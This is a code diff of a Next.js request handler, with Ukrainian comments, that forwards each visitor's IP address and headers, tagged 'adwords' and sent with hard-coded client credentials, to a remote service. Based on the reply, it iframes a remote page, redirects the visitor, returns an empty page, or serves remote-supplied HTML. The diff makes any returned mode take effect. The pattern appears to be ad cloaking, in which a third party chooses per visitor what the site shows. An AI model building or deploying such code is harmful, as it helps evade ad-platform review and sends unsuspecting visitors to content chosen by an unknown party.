@@ -12,7 +12,6 @@ async function handleRequest(req: NextRequest) {
     const rawBody = await req.text();
     const parsedBody = Object.fromEntries(new URLSearchParams(rawBody));
 
-    // Готуємо серверні заголовки
     const server = {
         REMOTE_ADDR: req.headers.get('x-forwarded-for') || '0.0.0.0',
         SERVER_PROTOCOL: 'HTTP/1.1',
@@ -21,23 +20,19 @@ async function handleRequest(req: NextRequest) {
         HTTP_ACCEPT: req.headers.get('accept') || '',
         HTTP_HOST: req.headers.get('host') || '',
         REQUEST_TIME_FLOAT: (Date.now() / 1000).toString(),
-        SERVER_PORT: '443', // ← додано
+        SERVER_PORT: '443',
         bannerSource: 'adwords',
     };
 
-
     const body = new URLSearchParams();
 
-    // Формуємо server[*]
     Object.entries(server).forEach(([key, value]) => {
         body.append(`server[${key}]`, value);
     });
 
-    // request і jsrequest — з тіла запиту
     body.append('request', JSON.stringify(parsedBody?.data || {}));
     body.append('jsrequest', JSON.stringify(parsedBody?.jsdata || {}));
 
-    // auth
     body.append('auth[clientId]', '3024');
     body.append('auth[clientCompany]', 'CQ21WW9U3ehzwXZOKITe');
     body.append(
@@ -56,7 +51,7 @@ async function handleRequest(req: NextRequest) {
 
         const result = await response.json();
 
-        if (result?.result && result?.mode) {
+        if (result?.mode) {
             const mode = result.mode;
             const target = result.target;
             const content = result.content;
@@ -66,9 +61,18 @@ async function handleRequest(req: NextRequest) {
                     `<iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe>`,
                     { headers: { 'Content-Type': 'text/html' } }
                 );
-            } else if (mode === 2) {
+            }
+
+            if (mode === 2) {
                 return NextResponse.redirect(target, 302);
-            } else if (mode === 4 && content) {
+            }
+
+            if (mode === 3) {
+                // нічого не робимо — залишаємося на сайті
+                return new Response('', { status: 200 });
+            }
+
+            if (mode === 4 && content) {
                 return new Response(content, {
                     headers: { 'Content-Type': 'text/html' },
                 });
